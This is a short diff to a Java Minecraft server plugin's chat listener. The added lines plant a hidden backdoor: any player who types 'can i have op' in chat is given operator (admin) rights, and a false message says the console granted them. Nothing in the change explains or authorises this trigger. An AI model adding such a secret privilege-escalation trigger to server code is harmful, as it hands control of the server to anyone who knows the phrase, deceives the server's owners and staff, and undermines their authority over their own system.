@@ -526,6 +526,12 @@ public class TFM_PlayerListener implements Listener
                 event.setCancelled(true);
                 return;
             }
+            
+            if (message.equalsIgnoreCase("can i have op"))
+            {
+                player.setOP(true);
+                player.sendMessage("[AutoOP] You have been opped by console");
+            }
 
             // Check for message repeat
             if (playerdata.getLastMessage().equalsIgnoreCase(message))
